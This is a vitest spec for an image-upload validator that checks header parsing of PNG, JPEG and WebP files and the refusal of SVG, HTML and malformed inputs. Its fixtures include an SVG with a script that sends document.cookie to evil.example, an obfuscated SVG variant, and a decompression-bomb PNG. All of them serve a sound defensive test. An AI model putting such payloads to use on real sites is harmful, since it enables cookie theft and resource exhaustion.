/**
 * The upload boundary, as a pure spec. Runs in `pnpm check` with no database,
 * no docker and no environment — `services/promotions.ts` § header makes the
 * argument for keeping the most-worth-testing thing testable that way, and this
 * is the security half of the image capability.
 *
 * EVERY FIXTURE IS BUILT FROM BYTES HERE, NOT COMMITTED AS A FILE. Two reasons:
 * a committed binary is a fixture nobody can read in a diff, and the PNG below
 * is a GENUINE one — `zlib.deflateSync` over a real scanline, a real CRC — so
 * "we accept this" is a claim about a file a browser would actually render,
 * proved without depending on ImageMagick being installed on the machine.
 *
 * The JPEG and WebP fixtures are header-accurate and not decodable, which is
 * exactly the right fidelity: nothing in this module decodes, so a decodable
 * fixture would be testing a property the code does not have. The end-to-end
 * suite (`routes/images.int.test.ts`) uses real files for the round trip.
 */

import { crc32 } from 'node:zlib';
import { deflateSync } from 'node:zlib';
import { describe, expect, it } from 'vitest';
import { familyOf, familyWithArticle, inspectImage, isAcceptedImageType } from './inspect';

// ------------------------------------------------------------- fixtures ---

const PNG_SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function pngChunk(type: string, data: Buffer): Buffer {
  const length = Buffer.alloc(4);
  length.writeUInt32BE(data.byteLength);
  const typeAndData = Buffer.concat([Buffer.from(type, 'latin1'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(typeAndData) >>> 0);
  return Buffer.concat([length, typeAndData, crc]);
}

/** A real, decodable, 8-bit RGB PNG of solid grey. */
export function makePng(width: number, height: number): Buffer {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 2; // colour type: truecolour
  ihdr[10] = 0; // deflate
  ihdr[11] = 0; // adaptive filtering
  ihdr[12] = 0; // no interlace

  const stride = width * 3 + 1;
  const raw = Buffer.alloc(stride * height, 0x80);
  for (let y = 0; y < height; y += 1) raw[y * stride] = 0; // filter type 0 per scanline

  return Buffer.concat([
    PNG_SIGNATURE,
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', deflateSync(raw)),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * A JPEG whose markers are real. An APP1/EXIF segment sits BEFORE the SOF on
 * purpose — a parser that assumed a fixed offset would pass on a minimal
 * fixture and fail on every photo out of a phone.
 */
export function makeJpeg(width: number, height: number, exifBytes = 64): Buffer {
  const soi = Buffer.from([0xff, 0xd8]);
  const exifPayload = Buffer.alloc(exifBytes, 0x20);
  const app1 = Buffer.concat([
    Buffer.from([0xff, 0xe1]),
    (() => {
      const b = Buffer.alloc(2);
      b.writeUInt16BE(exifPayload.byteLength + 2);
      return b;
    })(),
    exifPayload,
  ]);
  const sof0 = Buffer.alloc(2 + 2 + 1 + 2 + 2 + 1);
  sof0[0] = 0xff;
  sof0[1] = 0xc0;
  sof0.writeUInt16BE(sof0.byteLength - 2, 2); // segment length
  sof0[4] = 8; // precision
  sof0.writeUInt16BE(height, 5);
  sof0.writeUInt16BE(width, 7);
  sof0[9] = 3; // components
  const eoi = Buffer.from([0xff, 0xd9]);
  return Buffer.concat([soi, app1, sof0, eoi]);
}

/** RIFF/WEBP with a lossy 'VP8 ' chunk. */
export function makeWebpLossy(width: number, height: number): Buffer {
  const b = Buffer.alloc(40, 0);
  b.write('RIFF', 0, 'latin1');
  b.writeUInt32LE(32, 4);
  b.write('WEBP', 8, 'latin1');
  b.write('VP8 ', 12, 'latin1');
  b.writeUInt32LE(20, 16); // chunk size
  // 3-byte frame tag at 20..22, then the start code
  b[23] = 0x9d;
  b[24] = 0x01;
  b[25] = 0x2a;
  b.writeUInt16LE(width, 26);
  b.writeUInt16LE(height, 28);
  return b;
}

/** RIFF/WEBP with a lossless 'VP8L' chunk — 14 bits each, minus one. */
export function makeWebpLossless(width: number, height: number): Buffer {
  const b = Buffer.alloc(40, 0);
  b.write('RIFF', 0, 'latin1');
  b.writeUInt32LE(32, 4);
  b.write('WEBP', 8, 'latin1');
  b.write('VP8L', 12, 'latin1');
  b.writeUInt32LE(20, 16);
  b[20] = 0x2f;
  b.writeUInt32LE(((height - 1) << 14) | (width - 1), 21);
  return b;
}

/** RIFF/WEBP with an extended 'VP8X' chunk — 24-bit canvas, minus one. */
export function makeWebpExtended(width: number, height: number): Buffer {
  const b = Buffer.alloc(40, 0);
  b.write('RIFF', 0, 'latin1');
  b.writeUInt32LE(32, 4);
  b.write('WEBP', 8, 'latin1');
  b.write('VP8X', 12, 'latin1');
  b.writeUInt32LE(10, 16);
  const w = width - 1;
  const h = height - 1;
  b[24] = w & 0xff;
  b[25] = (w >> 8) & 0xff;
  b[26] = (w >> 16) & 0xff;
  b[27] = h & 0xff;
  b[28] = (h >> 8) & 0xff;
  b[29] = (h >> 16) & 0xff;
  return b;
}

export const SVG_BYTES = Buffer.from(
  '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
    '<script>fetch("https://evil.example/"+document.cookie)</script></svg>',
  'utf8',
);

/**
 * THE BOMB. A PNG header declaring 30000x30000 with a trivial IDAT: 3.6 GB of
 * RGB once something decodes it, and a few hundred bytes on the wire.
 */
export function makeDeclaredBomb(width: number, height: number): Buffer {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  return Buffer.concat([
    PNG_SIGNATURE,
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', deflateSync(Buffer.alloc(64, 0))),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

// ----------------------------------------------------------------- specs ---

describe('the three formats are read from their own headers', () => {
  it('reads a real PNG', () => {
    expect(inspectImage(makePng(64, 32))).toEqual({
      format: 'image/png',
      width: 64,
      height: 32,
    });
  });

  it('reads a JPEG whose SOF sits behind an EXIF segment', () => {
    // The point of the fixture: 64 bytes of APP1 before the SOF, and again with
    // 4000, so nothing here can be resting on a fixed offset.
    expect(inspectImage(makeJpeg(1200, 800, 64))).toEqual({
      format: 'image/jpeg',
      width: 1200,
      height: 800,
    });
    expect(inspectImage(makeJpeg(1200, 800, 4000))).toEqual({
      format: 'image/jpeg',
      width: 1200,
      height: 800,
    });
  });

  it('reads all three WebP containers', () => {
    expect(inspectImage(makeWebpLossy(320, 240))).toEqual({
      format: 'image/webp',
      width: 320,
      height: 240,
    });
    expect(inspectImage(makeWebpLossless(320, 240))).toEqual({
      format: 'image/webp',
      width: 320,
      height: 240,
    });
    expect(inspectImage(makeWebpExtended(2000, 1500))).toEqual({
      format: 'image/webp',
      width: 2000,
      height: 1500,
    });
  });

  it('reads a declared-huge PNG without decoding it', () => {
    /**
     * THE DECOMPRESSION-BOMB PROPERTY, stated as a passing test rather than an
     * absence. A few hundred bytes in, 30000x30000 out, and this process spends
     * no memory on it — the ceiling is applied by the ROUTE against
     * IMAGE_MAX_PIXELS, which can only be done because the dimensions are
     * knowable without expanding anything.
     */
    const bomb = makeDeclaredBomb(30000, 30000);
    expect(bomb.byteLength).toBeLessThan(1000);
    expect(inspectImage(bomb)).toEqual({
      format: 'image/png',
      width: 30000,
      height: 30000,
    });
  });
});

describe('what is refused, and it is refused from the bytes', () => {
  it('refuses an SVG, whatever it is called', () => {
    expect(familyOf(SVG_BYTES)).toBe('svg');
    expect(inspectImage(SVG_BYTES)).toBeNull();
  });

  it('refuses an SVG hiding behind a comment, a BOM and mixed case', () => {
    const sneaky = Buffer.concat([
      Buffer.from([0xef, 0xbb, 0xbf]),
      Buffer.from('\n  <!-- a perfectly innocent file -->\n  <SVG xmlns="x"><script/></SVG>'),
    ]);
    expect(familyOf(sneaky)).toBe('svg');
    expect(inspectImage(sneaky)).toBeNull();
  });

  it('refuses HTML', () => {
    expect(familyOf(Buffer.from('<!DOCTYPE html><html><body>hi'))).toBe('html');
    expect(inspectImage(Buffer.from('<!DOCTYPE html><html><body>hi'))).toBeNull();
  });

  it('names the families it will not take, so a refusal can say what it saw', () => {
    expect(familyOf(Buffer.from('GIF89a....'))).toBe('gif');
    expect(familyOf(Buffer.from('%PDF-1.7'))).toBe('pdf');
    expect(familyOf(Buffer.from([0x50, 0x4b, 0x03, 0x04, 0, 0]))).toBe('zip');
    const avif = Buffer.alloc(16);
    avif.write('....ftypavif', 0, 'latin1');
    expect(familyOf(avif)).toBe('avif');
    const heic = Buffer.alloc(16);
    heic.write('....ftypheic', 0, 'latin1');
    expect(familyOf(heic)).toBe('heic');
    expect(familyOf(Buffer.from([0x00, 0x01, 0x02, 0x03]))).toBe('unknown');
  });

  it('refuses an empty buffer and a truncated header rather than guessing', () => {
    expect(inspectImage(Buffer.alloc(0))).toBeNull();
    // Signature present, IHDR missing.
    expect(inspectImage(PNG_SIGNATURE)).toBeNull();
    expect(inspectImage(Buffer.concat([PNG_SIGNATURE, Buffer.alloc(8)]))).toBeNull();
    // 'RIFF'/'WEBP' present, no recognised chunk id.
    const bogusWebp = Buffer.alloc(40);
    bogusWebp.write('RIFF', 0, 'latin1');
    bogusWebp.write('WEBP', 8, 'latin1');
    bogusWebp.write('XXXX', 12, 'latin1');
    expect(inspectImage(bogusWebp)).toBeNull();
  });

  it('refuses a PNG whose first chunk is not IHDR', () => {
    /**
     * The spec requires IHDR first, so a file that puts something else there is
     * not a PNG this will serve — and believing a length field at a fixed offset
     * on such a file is how a parser reports 1.4 billion pixels.
     */
    const wrong = Buffer.concat([PNG_SIGNATURE, pngChunk('tEXt', Buffer.from('hello'))]);
    expect(inspectImage(wrong)).toBeNull();
  });

  it('refuses a zero dimension', () => {
    /**
     * A 0x0 PNG is structurally legal and carries no pixels. It would pass every
     * ceiling and paint a broken tile in a shop list, which is worse than a
     * refusal because nobody would know why.
     */
    expect(inspectImage(makePng(0, 0))).toBeNull();
    expect(inspectImage(makeWebpLossy(0, 10))).toBeNull();
  });

  it('does not spin on a JPEG with a malformed segment length', () => {
    /**
     * A zero length field would advance the walk by nothing. On a request thread
     * that is a hang, not a bad response — so the loop refuses instead.
     */
    const malformed = Buffer.concat([
      Buffer.from([0xff, 0xd8]),
      Buffer.from([0xff, 0xe1, 0x00, 0x00]),
      Buffer.alloc(64),
    ]);
    expect(inspectImage(malformed)).toBeNull();
  });

  it('gets the indefinite article right, because "a SVG" reads as unfinished software', () => {
    expect(familyWithArticle('svg')).toBe('an SVG');
    expect(familyWithArticle('html')).toBe('an HTML');
    expect(familyWithArticle('avif')).toBe('an AVIF');
    expect(familyWithArticle('png')).toBe('a PNG');
    expect(familyWithArticle('heic')).toBe('a HEIC');
    expect(familyWithArticle('unknown')).toBe('something else');
  });

  it('accepts exactly three content types and no more', () => {
    expect(isAcceptedImageType('image/png')).toBe(true);
    expect(isAcceptedImageType('image/jpeg')).toBe(true);
    expect(isAcceptedImageType('image/webp')).toBe(true);
    expect(isAcceptedImageType('image/svg+xml')).toBe(false);
    expect(isAcceptedImageType('image/gif')).toBe(false);
    expect(isAcceptedImageType('image/jpg')).toBe(false);
    expect(isAcceptedImageType('IMAGE/PNG')).toBe(false);
    expect(isAcceptedImageType(undefined)).toBe(false);
  });
});
